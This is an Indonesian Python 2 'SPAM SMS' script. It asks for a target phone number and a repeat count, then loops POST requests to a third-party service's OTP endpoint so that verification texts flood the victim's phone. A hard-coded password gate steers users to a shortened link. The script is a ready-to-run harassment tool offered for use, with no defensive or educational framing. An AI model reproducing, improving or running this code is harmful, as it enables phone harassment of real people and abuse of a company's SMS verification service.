
        # coding:utf8

# TUTORIAL : Kingtebe
# YOUTUBE  : Black-IT
# GITHUB   : https://github.com/KINGTEBE-404
# Python   : 2.7

import os,sys,json,time

try:
# Dimana Module requests belom di install
   import requests
except ImportError:
   print("\n [!] Silahkan install module requests")
   print("     ketik : pip2 install requests\n")
   sys.exit()


os.system('clear')

# banner
logo = """


		 ╔═══╦═══╦═══╦═╗╔═╗ ╔═══╦═╗╔═╦═══╗
	         ║╔═╗║╔═╗║╔═╗║║╚╝║║ ║╔═╗║║╚╝║║╔═╗║
	         ║╚══╣╚═╝║║─║║╔╗╔╗║ ║╚══╣╔╗╔╗║╚══╗
	         ╚══╗║╔══╣╚═╝║║║║║║ ╚══╗║║║║║╠══╗║
	         ║╚═╝║║──║╔═╗║║║║║║ ║╚═╝║║║║║║╚═╝║
	       	 ╚═══╩╝──╚╝─╚╩╝╚╝╚╝ ╚═══╩╝╚╝╚╩═══╝

	     [•] Author  : opoy1st
	     [•] Youtube : Channel Tutorials
	     [•] BIODATA : Newbie Forever
     ‹-----------------------------------------------------›
"""

print(logo)

print("Silahkan Copy Link : https://realsht.mobi/V6Yif")
Pass = "SUBSCRIBELAHGANKALOKAGASUBSCRIBEMALESBIKINGINIANLAGIGUApwnyapanjangbiarkaliangkbsketikmanaulwkwkekahahaha"

loop = 'true'
while (loop == 'true'):
                password = raw_input("Masukan Password   : ")
                if (password == Pass):
                        print "Login Succsesfuly"
                        time.sleep(2)
                        loop = 'false'
                else:
                        print "password salah"
os.system('clear')

# banner
logo = """


	            ╔═══╦═══╦═══╦═╗╔═╗ ╔═══╦═╗╔═╦═══╗
	            ║╔═╗║╔═╗║╔═╗║║╚╝║║ ║╔═╗║║╚╝║║╔═╗║
	            ║╚══╣╚═╝║║─║║╔╗╔╗║ ║╚══╣╔╗╔╗║╚══╗
	            ╚══╗║╔══╣╚═╝║║║║║║ ╚══╗║║║║║╠══╗║
	            ║╚═╝║║──║╔═╗║║║║║║ ║╚═╝║║║║║║╚═╝║
	            ╚═══╩╝──╚╝─╚╩╝╚╝╚╝ ╚═══╩╝╚╝╚╩═══╝

	     [•] Author  : opoy1st
	     [•] Youtube : Channel Tutorials
	     [•] BIODATA : Newbie Forever
        ‹-----------------------------------------------------›
"""

print(logo)
# Penginputan Nomor Target
target = raw_input(" [•] Target : ")
# Penginputan Jumlah Spam
jumlah = raw_input(" [•] Jumlah : ")
print('')

req = requests.Session()

# Web Api Harnic.ID
# banner

url = "https://api.harnicid.com/phone_auth_OTP"

for i in range(int(jumlah)):
        respon = req.post(url,data={'phone':target}).text
        status = json.loads(respon)['message']
        if status == 'OTP sent':
                print(" Spam Ke "+ target +" Gagal Jancok")
                # Jeda Waktu / Seccond
                time.sleep(2)
        else:
                print(" Spam Ke "+ target +" Berhasil!! Anjir Bet Dah!!")
                # Jeda Waktu / Seccond
                time.sleep(2)
